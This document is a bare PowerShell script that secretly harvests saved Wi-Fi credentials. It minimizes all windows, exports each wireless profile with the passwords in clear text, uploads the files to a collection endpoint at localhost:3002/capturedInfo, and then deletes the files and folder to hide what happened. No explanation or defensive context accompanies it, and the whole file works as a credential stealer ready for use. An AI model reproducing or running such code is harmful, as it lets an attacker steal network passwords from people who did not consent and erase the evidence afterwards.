# Hide all windows
$null = (New-Object -ComObject Shell.Application).MinimizeAll()

# Define the folder name and path
$folderName = "NetworkProfiles"
$desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::DesktopDirectory)
$folderPath = Join-Path $desktopPath $folderName

$remoteURL = "http://localhost:3002/capturedInfo"
$webClient = New-Object System.Net.WebClient

# Create the folder on the desktop if it doesn't exist
if (-not (Test-Path -Path $folderPath -PathType Container)) {
    New-Item -Path $folderPath -ItemType Directory
    Write-Host "Created folder: $folderPath"
}

# Export all network profiles using netsh
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" }

foreach ($profile in $profiles) {
    $profileName = $profile.Trim()
    $profileFilePath = Join-Path $folderPath "$profileName.xml"
    Write-Host "Exporting profile file path : $profileFilePath "
    netsh wlan export profile name="$profileName" key=clear folder="$folderPath"
    Write-Host "Exported profile: $profileName"
}

# Get a list of files in the folder
$fileList = Get-ChildItem -Path $folderPath

foreach ($file in $fileList) {
    $filePath = $file.FullName
    try {
        $response = $webClient.UploadFile($remoteURL, $filePath)
        if ($response) {
            Write-Host "Successfully uploaded file: $filePath"
        }
        else {
            Write-Host "Failed to upload file: $filePath"
        }
        #Write-Host "Response: $response"
        Write-Host "Uploaded file: $filePath"

        # Delete the file from the desktop
        Remove-Item -Path $filePath -Force
        Write-Host "File deleted from the desktop!"
    }
    catch {
        Write-Host "Failed to upload file: $filePath"
        Write-Host "Error: $_.Exception.Message"
    }
}

# Delete the folder from the desktop after all files have been uploaded
Remove-Item -Path $folderPath -Force
Write-Host "Folder deleted from the desktop!"

# Dispose of the WebClient object
$webClient.Dispose()

# Close after script
exit